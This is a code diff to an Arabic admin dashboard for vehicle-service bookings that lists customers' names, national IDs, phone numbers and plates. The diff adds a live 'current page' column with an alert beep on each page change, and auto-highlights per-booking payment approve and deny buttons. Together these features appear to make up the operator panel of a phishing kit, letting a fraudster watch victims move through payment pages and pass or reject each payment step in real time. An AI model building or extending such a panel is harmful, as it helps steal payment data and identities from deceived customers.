@@ -406,11 +406,11 @@
           <thead>
             <tr>
               <th>المرجع</th><th>الاسم</th><th>الهوية</th><th>الجوال</th>
-              <th>اللوحة</th><th>التاريخ</th><th>الحالة</th><th>الإجراءات</th>
+              <th>اللوحة</th><th>التاريخ</th><th>الحالة</th><th>الصفحة الحالية</th><th>الإجراءات</th>
             </tr>
           </thead>
           <tbody id="tBody">
-            <tr><td colspan="8"><div class="empty"><i class="bi bi-inbox"></i>جاري التحميل...</div></td></tr>
+            <tr><td colspan="9"><div class="empty"><i class="bi bi-inbox"></i>جاري التحميل...</div></td></tr>
           </tbody>
         </table>
       </div>
@@ -548,9 +548,18 @@
   function renderRows(list) {
     const tb = document.getElementById("tBody");
     if (!list.length) {
-      tb.innerHTML = `<tr><td colspan="8"><div class="empty"><i class="bi bi-inbox"></i>لا توجد حجوزات</div></td></tr>`;
+      tb.innerHTML = `<tr><td colspan="9"><div class="empty"><i class="bi bi-inbox"></i>لا توجد حجوزات</div></td></tr>`;
       return;
     }
+    // حفظ بيانات الصفحة الحالية قبل إعادة الرسم
+    const savedPageLabels = {};
+    document.querySelectorAll('#tBody tr').forEach(row => {
+      const codeEl = row.querySelector('code');
+      const pageCell = row.querySelector('.page-label-cell');
+      if (codeEl && pageCell && pageCell.textContent) {
+        savedPageLabels[codeEl.textContent.trim()] = pageCell.textContent;
+      }
+    });
     tb.innerHTML = list.map(b => {
       const dt = (b.serviceDate||"").substring(0,10) || "-";
       const uc = !b.statusRead ? "unread" : "";
@@ -564,6 +573,7 @@
         <td>${b.vehiclePlate||"-"}</td>
         <td>${dt}</td>
         <td>${badge(b.status)}${newBadge}</td>
+        <td class="page-label-cell" style="font-size:11px;color:#64748b;max-width:120px;" data-ref="${b.referenceId}">${savedPageLabels[b.referenceId]||''}</td>
         <td>
           <div class="act-btns">
             <button class="btn-act blue" onclick="openDetail('${b.referenceId}')">
@@ -922,8 +932,51 @@
         if (rowIdx !== -1) rows[rowIdx].status = newStatus;
       }
       loadAll();
+      // إضاءة أزرار القبول/الرفض تلقائياً إذا كانت النافذة مفتوحة
       if (currentOpenRef && currentOpenRef === d.reference) {
-        setTimeout(() => openDetail(d.reference), 500);
+        setTimeout(() => {
+          openDetail(d.reference);
+          // بعد فتح التفاصيل أضف الفئة active
+          setTimeout(() => {
+            const approveBtn = document.getElementById(`pay-pass-${d.reference}`);
+            const rejectBtn = document.getElementById(`pay-denied-${d.reference}`);
+            if (approveBtn) approveBtn.classList.add('active');
+            if (rejectBtn) rejectBtn.classList.add('active');
+          }, 200);
+        }, 300);
+      }
+    });
+    // معالجة تحديث موقع العميل
+    sock.on("locationUpdate", (d) => {
+      if (!d.referenceId) return;
+      const label = d.pageLabel || d.page || '';
+      // تحديث خلية الصفحة الحالية في الجدول مباشرة
+      const pageCells = document.querySelectorAll(`#tBody .page-label-cell[data-ref="${d.referenceId}"]`);
+      if (pageCells.length > 0) {
+        pageCells.forEach(cell => { cell.textContent = label; });
+      } else {
+        // بحث بديل إذا لم يوجد data-ref
+        const allRows = document.querySelectorAll('#tBody tr');
+        allRows.forEach(row => {
+          const codeEl = row.querySelector('code');
+          if (codeEl && codeEl.textContent.trim() === d.referenceId) {
+            const pageCell = row.querySelector('.page-label-cell');
+            if (pageCell) pageCell.textContent = label;
+          }
+        });
+      }
+      // صوت تنبيه خفيف عند تغيير الصفحة
+      if (label) {
+        try {
+          const ctx = new (window.AudioContext || window.webkitAudioContext)();
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.connect(gain); gain.connect(ctx.destination);
+          osc.frequency.value = 880;
+          gain.gain.setValueAtTime(0.15, ctx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
+          osc.start(); osc.stop(ctx.currentTime + 0.3);
+        } catch(e) {}
       }
     });
     sock.on("visitorsCount", (d) => {
